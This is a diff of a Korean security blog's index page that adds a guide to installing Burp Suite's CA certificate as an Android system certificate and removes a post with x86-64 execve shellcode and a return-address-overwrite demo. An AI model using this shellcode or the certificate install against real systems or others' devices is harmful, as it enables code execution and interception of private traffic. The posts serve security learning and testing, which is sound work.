@@ -9,7 +9,7 @@
   <meta name="author" content="KC">
 
   
-  <meta name="description" content="Fermin J. Serna 의 The info leak era on software exploitation 를 읽고 정리해본다. 참고: Modeling the exploitation and mitigation of memory safety &hellip;">
+  <meta name="description" content="Burp Burp 를 띄우고, Proxy -> Options -> CA Certificate -> Certificate in DER format -> Next -> Select File -> burp.der -> Save -> Next -> Close 이렇게 해서 &hellip;">
   
 
   <!-- http://t.co/dKP3o1e -->
@@ -65,6 +65,74 @@
     <div id="content">
       <div class="blog-index">
   
+  
+  
+    <article>
+      
+  <header>
+    
+      <h1 class="entry-title"><a href="/blog/2014/11/12/how-to-import-burps-ca-certificate-into-android-devices/">How to Import Burp's CA Certificate Into Android Devices</a></h1>
+    
+    
+      <p class="meta">
+        
+
+
+
+
+<time class='entry-date' datetime='2014-11-12T16:51:43+09:00'><span class='date'><span class='date-month'>Nov</span> <span class='date-day'>12</span><span class='date-suffix'>th</span>, <span class='date-year'>2014</span></span> <span class='time'>4:51 pm</span></time>
+        
+      </p>
+    
+  </header>
+
+
+  <div class="entry-content"><h4>Burp</h4>
+
+<p>Burp 를 띄우고,</p>
+
+<p>Proxy -> Options -> CA Certificate -> Certificate in DER format -> Next -> Select File -> burp.der -> Save -> Next -> Close</p>
+
+<p>이렇게 해서 PortSwigger CA 인증서를 export 한다.</p>
+
+<p>이제</p>
+
+<p>DER 인코딩을 PEM 으로 바꾼 인증서를 하나 만든다.</p>
+
+<p>$ openssl x509 -inform DER -in burp.der -out burp.crt</p>
+
+<p>이제 hash 를 얻는다.</p>
+
+<p>$ openssl x509 -inform PEM -subject_hash_old -in burp.crt | head -1
+9a5ba575</p>
+
+<p>이제 안드로이드 포맷에 맞게 맞춰준다.</p>
+
+<pre><code>$ cat burp.crt &gt; 9a5ba575.0
+$ openssl x509 -inform PEM -text -in burp.crt -out /dev/null &gt;&gt; 9a5ba575.0
+</code></pre>
+
+<p>안드로이드로 옮긴다.</p>
+
+<pre><code>$ adb push 9a5ba575.0 /sdcard/
+$ adb shell
+# mount -o remount,rw /system
+# cp /sdcard/9a5ba575.0 /system/etc/security/cacerts/
+# chmod 644 /system/etc/security/cacerts/9a5ba575.0
+</code></pre>
+
+<h4>참고</h4>
+
+<ul>
+<li><a href="http://wiki.pcprobleemloos.nl/android/cacert">Installing CAcert certificates on Android as &lsquo;system&rsquo; credentials without lockscreen</a></li>
+</ul>
+
+</div>
+  
+  
+
+
+    </article>
   
   
     <article>
@@ -596,78 +664,6 @@ $
 
     </article>
   
-  
-    <article>
-      
-  <header>
-    
-      <h1 class="entry-title"><a href="/blog/2014/11/10/linux-x86-64-shellcode-4/">Linux X86_64 Shellcode 4</a></h1>
-    
-    
-      <p class="meta">
-        
-
-
-
-
-<time class='entry-date' datetime='2014-11-10T01:54:46+09:00'><span class='date'><span class='date-month'>Nov</span> <span class='date-day'>10</span><span class='date-suffix'>th</span>, <span class='date-year'>2014</span></span> <span class='time'>1:54 am</span></time>
-        
-      </p>
-    
-  </header>
-
-
-  <div class="entry-content"><p>이번에는 쉘코드를 2 개로 나누어서, 첫번째는 <code>retq</code> 로 끊는다. <code>return address</code> 2 개를 적재하여, <code>retq</code> 로 두번쨰 gadget 이 실행되도록 한다. 첫번째 <code>_shellcode</code> 의 <code>\xc3</code> 이 <code>retq</code> 이다.</p>
-
-<pre><code>char *_shellcode = ""
-    "\x48\x31\xd2"
-    "\x48\xbb\x2f\x2f\x62\x69\x6e\x2f\x73\x68"
-    "\x48\xc1\xeb\x08"
-    "\xc3"; // retq
-
-char *_shellcode2 = ""
-    "\x53"
-    "\x48\x89\xe7"
-    "\x48\x31\xc0" // xor %rax,%rax
-    "\x50"
-    "\x57"
-    "\x48\x89\xe6"
-    "\xb0\x3b"
-    "\x0f\x05" ;
-
-
-void explode() {
-    long *ret;
-    ret = (long *)&amp;ret;
-    ret++; // pass local variable
-    ret++; // pass %rbp
-    *ret = _shellcode;
-    ret++;
-    *ret = _shellcode2;
-}
-
-main()
-{
-    explode();
-}
-
-z@ubuntu:~/shells% ./rop
-$
-</code></pre>
-
-<h4>참고</h4>
-
-<ul>
-<li><a href="https://cseweb.ucsd.edu/~hovav/dist/rop.pdf">Return-Oriented Programming: Systems, Languages, and Applications</a></li>
-</ul>
-
-</div>
-  
-  
-
-
-    </article>
-  
   <div class="pagination">
     
       <a class="prev" href="/posts/12">&larr; Older</a>
@@ -685,6 +681,10 @@ $
   <ul id="recent_posts">
     
       <li class="post">
+        <a href="/blog/2016/04/26/rsa-sample-number/">RSA Sample Number</a>
+      </li>
+    
+      <li class="post">
         <a href="/blog/2016/03/25/bleichenbacher/">Bleichenbacher</a>
       </li>
     
@@ -698,10 +698,6 @@ $
     
       <li class="post">
         <a href="/blog/2016/02/16/plaid-ctf-2015-one-null-byte/">Plaid CTF 2015 - One NULL Byte</a>
-      </li>
-    
-      <li class="post">
-        <a href="/blog/2016/02/12/understanding-the-heap-and-exploiting-heap-overflows/">Understanding the Heap &amp; Exploiting Heap Overflows</a>
       </li>
     
   </ul>
